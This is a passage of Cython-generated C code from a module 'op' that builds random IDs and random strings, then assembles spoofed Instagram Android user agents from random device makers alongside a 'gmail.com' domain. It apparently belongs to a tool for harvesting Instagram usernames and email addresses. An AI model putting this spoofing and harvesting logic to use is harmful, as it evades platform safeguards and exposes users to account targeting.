__pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n\n    \n    __Pyx_XDECREF(__pyx_r);\n    __Pyx_INCREF(__pyx_v_Id);\n    __pyx_r = __pyx_v_Id;\n    goto __pyx_L0;\n\n    \n  }\n\n  \n   {\n    __pyx_t_1 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_rand_ids); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 391, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __pyx_t_5 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_2))) {\n      __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);\n      assert(__pyx_t_1);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_2);\n      __Pyx_INCREF(__pyx_t_1);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_2, __pyx__function);\n      __pyx_t_5 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[3] = {__pyx_t_1, __pyx_v_bbk, __pyx_v_Ido};\n      __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+__pyx_t_5, (3-__pyx_t_5) | (__pyx_t_5*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 391, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_4);\n    }\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  }\n\n  \n\n  \n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_AddTraceback("op.rand_ids", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_Id);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_19uuu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); \nstatic PyMethodDef __pyx_mdef_2op_19uuu = {"uuu", (PyCFunction)__pyx_pw_2op_19uuu, METH_NOARGS, 0};\nstatic PyObject *__pyx_pw_2op_19uuu(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("uuu (wrapper)", 0);\n  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);\n  __pyx_r = __pyx_pf_2op_18uuu(__pyx_self);\n\n  \n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\nstatic PyObject *__pyx_gb_2op_3uuu_2generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); \n\n\n\nstatic PyObject *__pyx_pf_2op_3uuu_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {\n  struct __pyx_obj_2op___pyx_scope_struct_3_genexpr *__pyx_cur_scope;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  __pyx_cur_scope = (struct __pyx_obj_2op___pyx_scope_struct_3_genexpr *)__pyx_tp_new_2op___pyx_scope_struct_3_genexpr(__pyx_mstate_global->__pyx_ptype_2op___pyx_scope_struct_3_genexpr, __pyx_mstate_global->__pyx_empty_tuple, NULL);\n  if (unlikely(!__pyx_cur_scope)) {\n    __pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct_3_genexpr *)Py_None);\n    __Pyx_INCREF(Py_None);\n    __PYX_ERR(0, 406, __pyx_L1_error)\n  } else {\n    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);\n  }\n  {\n    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_2op_3uuu_2generator3, ((PyObject *)__pyx_mstate_global->__pyx_codeobj_tab[3]), (PyObject *) __pyx_cur_scope, __pyx_mstate_global->__pyx_n_u_genexpr, __pyx_mstate_global->__pyx_n_u_uuu_locals_genexpr, __pyx_mstate_global->__pyx_n_u_op); if (unlikely(!gen)) __PYX_ERR(0, 406, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_cur_scope);\n    __Pyx_RefNannyFinishContext();\n    return (PyObject *) gen;\n  }\n\n  \n  __pyx_L1_error:;\n  __Pyx_AddTraceback("op.uuu.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __Pyx_DECREF((PyObject *)__pyx_cur_scope);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_gb_2op_3uuu_2generator3(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) \n{\n  struct __pyx_obj_2op___pyx_scope_struct_3_genexpr *__pyx_cur_scope = ((struct __pyx_obj_2op___pyx_scope_struct_3_genexpr *)__pyx_generator->closure);\n  PyObject *__pyx_r = NULL;\n  long __pyx_t_1;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  size_t __pyx_t_6;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("genexpr", 0);\n  switch (__pyx_generator->resume_label) {\n    case 0: goto __pyx_L3_first_run;\n    default: \n    __Pyx_RefNannyFinishContext();\n    return NULL;\n  }\n  __pyx_L3_first_run:;\n  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 406, __pyx_L1_error)\n  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 406, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_r);\n\n  \n  for (__pyx_t_1 = 0; __pyx_t_1 < 32; __pyx_t_1+=1) {\n    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;\n\n    \n    __pyx_t_3 = NULL;\n    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 406, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_4);\n    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 406, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __pyx_t_6 = 1;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_5))) {\n      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_5);\n      assert(__pyx_t_3);\n      PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n      __Pyx_INCREF(__pyx_t_3);\n      __Pyx_INCREF(__pyx__function);\n      __Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n      __pyx_t_6 = 0;\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_mstate_global->__pyx_n_u_azertyuiopmlkjhgfdsqwxcvbnAZERTY};\n      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 406, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_2);\n    }\n    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_2))) __PYX_ERR(0, 406, __pyx_L1_error)\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  }\n  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);\n\n  \n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  if (__Pyx_PyErr_Occurred()) {\n    __Pyx_Generator_Replace_StopIteration(0);\n    __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  }\n  __pyx_L0:;\n  __Pyx_XGIVEREF(__pyx_r);\n  #if !CYTHON_USE_EXC_INFO_STACK\n  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);\n  #endif\n  __pyx_generator->resume_label = -1;\n  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\nstatic PyObject *__pyx_pf_2op_18uuu(CYTHON_UNUSED PyObject *__pyx_self) {\n  PyObject *__pyx_v_domain = NULL;\n  long __pyx_v_bbk;\n  long __pyx_v_Ido;\n  PyObject *__pyx_v_rnd = NULL;\n  PyObject *__pyx_v_user_agent = NULL;\n  PyObject *__pyx_v_Id = NULL;\n  PyObject *__pyx_v_lsd = NULL;\n  PyObject *__pyx_v_headers = NULL;\n  PyObject *__pyx_v_data = NULL;\n  PyObject *__pyx_v_response = NULL;\n  PyObject *__pyx_v_username = NULL;\n  PyObject *__pyx_v_rr = NULL;\n  PyObject *__pyx_v_fows = NULL;\n  PyObject *__pyx_v_email = NULL;\n  CYTHON_UNUSED PyObject *__pyx_v_e = NULL;\n  PyObject *__pyx_gb_2op_3uuu_2generator3 = 0;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  size_t __pyx_t_9;\n  PyObject *__pyx_t_10 = NULL;\n  PyObject *__pyx_t_11 = NULL;\n  PyObject *__pyx_t_12 = NULL;\n  int __pyx_t_13;\n  int __pyx_t_14;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("uuu", 0);\n\n  \n  while (1) {\n\n    \n    {\n      __Pyx_PyThreadState_declare\n      __Pyx_PyThreadState_assign\n      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_1);\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_3);\n       {\n\n        \n        __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_gmail_com);\n        __Pyx_XDECREF_SET(__pyx_v_domain, __pyx_mstate_global->__pyx_kp_u_gmail_com);\n\n        \n        __pyx_v_bbk = 0x10ACCC80;\n\n        \n        __pyx_v_Ido = 0x35B40430;\n\n        \n        while (1) {\n\n          \n          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 402, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 402, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_mstate_global->__pyx_tuple[17], NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 402, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __pyx_t_5 = __Pyx_PyObject_Unicode(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 402, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_XDECREF_SET(__pyx_v_rnd, ((PyObject*)__pyx_t_5));\n          __pyx_t_5 = 0;\n\n          \n          __pyx_t_5 = PyList_New(6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_23_6_0);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_23_6_0);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 0, __pyx_mstate_global->__pyx_kp_u_23_6_0) != (0)) __PYX_ERR(0, 403, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_24_7_0);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_24_7_0);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 1, __pyx_mstate_global->__pyx_kp_u_24_7_0) != (0)) __PYX_ERR(0, 403, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_25_7_1_1);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_25_7_1_1);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 2, __pyx_mstate_global->__pyx_kp_u_25_7_1_1) != (0)) __PYX_ERR(0, 403, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_26_8_0);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_26_8_0);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 3, __pyx_mstate_global->__pyx_kp_u_26_8_0) != (0)) __PYX_ERR(0, 403, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_27_8_1);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_27_8_1);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 4, __pyx_mstate_global->__pyx_kp_u_27_8_1) != (0)) __PYX_ERR(0, 403, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_28_9_0);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_28_9_0);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_5, 5, __pyx_mstate_global->__pyx_kp_u_28_9_0) != (0)) __PYX_ERR(0, 403, __pyx_L5_error);\n          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_mstate_global->__pyx_tuple[18], NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = __Pyx_PyObject_GetItem(__pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = PyNumber_Add(__pyx_mstate_global->__pyx_kp_u_Instagram_311_0_0_32_118_Android, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = PyNumber_Add(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u__11); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_mstate_global->__pyx_tuple[19], NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __pyx_t_5 = __Pyx_PyObject_Unicode(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = PyNumber_Add(__pyx_t_6, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_dpi); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_mstate_global->__pyx_tuple[20], NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = __Pyx_PyObject_Unicode(__pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = PyNumber_Add(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_x); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_mstate_global->__pyx_tuple[20], NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __pyx_t_5 = __Pyx_PyObject_Unicode(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = PyNumber_Add(__pyx_t_6, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n          \n          __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_mstate_global->__pyx_kp_u__11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __pyx_t_4 = PyList_New(12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_SAMSUNG);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_SAMSUNG);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 0, __pyx_mstate_global->__pyx_n_u_SAMSUNG) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_HUAWEI);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_HUAWEI);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 1, __pyx_mstate_global->__pyx_n_u_HUAWEI) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_LGE_lge);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_kp_u_LGE_lge);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 2, __pyx_mstate_global->__pyx_kp_u_LGE_lge) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_HTC);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_HTC);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 3, __pyx_mstate_global->__pyx_n_u_HTC) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_ASUS);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_ASUS);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 4, __pyx_mstate_global->__pyx_n_u_ASUS) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_ZTE);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_ZTE);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 5, __pyx_mstate_global->__pyx_n_u_ZTE) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_ONEPLUS);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_ONEPLUS);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 6, __pyx_mstate_global->__pyx_n_u_ONEPLUS) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_XIAOMI);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_XIAOMI);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 7, __pyx_mstate_global->__pyx_n_u_XIAOMI) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_OPPO);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_OPPO);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 8, __pyx_mstate_global->__pyx_n_u_OPPO) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_VIVO);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_VIVO);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 9, __pyx_mstate_global->__pyx_n_u_VIVO) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_SONY);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_SONY);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 10, __pyx_mstate_global->__pyx_n_u_SONY) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_INCREF(__pyx_mstate_global->__pyx_n_u_REALME);\n          __Pyx_GIVEREF(__pyx_mstate_global->__pyx_n_u_REALME);\n          if (__Pyx_PyList_SET_ITEM(__pyx_t_4, 11, __pyx_mstate_global->__pyx_n_u_REALME) != (0)) __PYX_ERR(0, 404, __pyx_L5_error);\n          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_random); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_7);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_mstate_global->__pyx_tuple[21], NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n          __pyx_t_7 = __Pyx_PyObject_GetItem(__pyx_t_4, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_7);\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n          __pyx_t_7 = PyNumber_Add(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_SM_T); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_7);\n          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n          __pyx_t_6 = PyNumber_Add(__pyx_t_7, __pyx_v_rnd); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 404, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_6);\n          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n          __pyx_t_7 = PyNumber_Add(__pyx_t_6, __pyx_mstate_global->__pyx_kp_u_SM_T); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 404, 